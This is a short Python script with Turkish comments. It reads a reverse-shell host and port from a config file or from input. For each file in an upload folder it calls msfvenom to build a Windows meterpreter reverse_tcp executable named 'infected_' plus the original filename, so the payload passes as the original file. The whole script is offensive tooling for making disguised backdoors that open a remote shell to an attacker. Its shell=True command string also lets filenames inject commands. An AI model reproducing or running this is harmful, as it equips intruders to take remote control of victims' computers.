import os
import subprocess

# Dosya yolları
upload_dir = "upload"
infected_dir = "infected"
config_file = "config.fkn"

# Reverse shell bilgilerini al
def get_reverse_shell():
    if os.path.exists(config_file):
        with open(config_file, "r") as file:
            return file.read().strip()
    else:
        return input("Reverse shell bağlantı adresini gir (örn. 192.168.1.100:4444): ")

# Dosyaları enfekte et ve infected klasörüne kaydet
def infect_files():
    if not os.path.exists(infected_dir):
        os.makedirs(infected_dir)
    
    reverse_shell = get_reverse_shell()

    for filename in os.listdir(upload_dir):
        file_path = os.path.join(upload_dir, filename)
        if os.path.isfile(file_path):
            output_file = os.path.join(infected_dir, f"infected_{filename}")
            # msfvenom komutu ile dosyayı enfekte et
            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={reverse_shell.split(':')[0]} LPORT={reverse_shell.split(':')[1]} -f exe -o {output_file}"
            print(f"{filename} dosyası enfekte ediliyor...")
            subprocess.run(command, shell=True)
            print(f"Enfekte edilmiş dosya: {output_file}")

if __name__ == "__main__":
    infect_files()
